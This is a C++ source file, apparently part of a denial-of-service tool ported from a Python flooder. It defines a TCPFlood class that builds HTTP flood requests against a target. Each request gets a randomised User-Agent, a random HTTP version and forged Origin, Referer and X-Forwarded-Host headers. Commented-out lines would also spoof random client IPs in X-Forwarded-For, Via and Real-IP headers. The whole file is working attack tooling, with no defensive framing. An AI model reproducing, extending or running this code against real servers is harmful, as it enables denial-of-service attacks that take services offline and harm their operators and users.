#include "../include/TCPFlood.h"
#include <string>
#include <sstream>

namespace cotton {


const string& TCPFlood::getHeader() const { return header_; }

const string& TCPFlood::getRequest() const { return request_; }

const string& TCPFlood::getDefaultHeader() const { return defaultHeader_; }

void TCPFlood::updateDefaultHeader(const string& ip, const string& origin, const string& raw_authority)
{
    // TODO: find out parsing similar to Python's YARL
	
    // URL('http://john:pass@хост.домен:8000').raw_authority
    // 'john:pass@xn--n1agdj.xn--d1acufc:8000'

    
	//ProxyManager* proxyManager = ProxyManager::getInstance();
	//string ip = proxyManager->getRandomIPv4(); //   ip: str = Tools.rand_ipv4()
    //string origin = "111.222.000.111"; //    origin = str(self._url.origin())
    //string raw_authority = "111.111.111.111"; // self._url.raw_authority

    time_t t;
    srand((unsigned) time(&t));

    int a=rand()%255, b=rand()%255, c=rand()%255, d=rand()%255;

    std::stringstream sstr;
    
    sstr << flood::TCPHeaderBase
		<< "Host: " << target_.authority()  // raw_authority + rn
        << "\r\nOrigin: " << target_.encoded_origin() //origin
        << "\r\nReferer: " << target_.encoded_origin() // origin // emulate Referrer-Policy: origin
        << "\r\nUser-Agent: " << USERAGENTS[rand() % USERAGENTS.size()]
        << "\r\nX-Forwarded-Host: " << target_.encoded_authority() // + raw_authority
        //<< "\r\nVia: " <<a<<'.'<<b<<'.'<<c<<'.'<<d
        //<< "\r\nClient-IP: " <<a<<'.'<<b<<'.'<<c<<'.'<<d
        //<< "\r\nX-Forwarded-Proto: https" //+ "https"
        //<< "\r\nX-Forwarded-For: "<<a<<'.'<<b<<'.'<<c<<'.'<<d
        //<< "\r\nReal-IP: " <<a<<'.'<<b<<'.'<<c<<'.'<<d
    ;

    defaultHeader_ = sstr.str();
}

void TCPFlood::updateRequest(const RequestType& reqestType, const string& qsPathRaw, const string& body)
{
    // https://yarl.aio-libs.org/en/latest/api/#
    //
    // URL('http://example.com/шлях/сюди?ключ=знач').raw_path_qs
    // '/%D1%88%D0%BB%D1%8F%D1%85/%D1%81%D1%8E%D0%B4%D0%B8?%D0%BA%D0%BB%D1%8E%D1%87=%D0%B7%D0%BD%D0%B0%D1%87'
    //
    std::stringstream sstr;
    
	sstr << flood::RequestTypeStr.at(reqestType) << " " << qsPathRaw;
        
    if (target_.has_query()) 
        sstr << '?'<< target_.encoded_query();
        
	sstr << " HTTP/1."<< rand() % 3 << "\r\n" //+ rn; 
	     << header_ //;
	     << "\r\n\r\n" //rn + rn;
	     << body
    ;

    request_ = sstr.str();
    /*
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
    */
}


void TCPFlood::updateHeader(const string& headers)
{
		header_ = headers;
}
}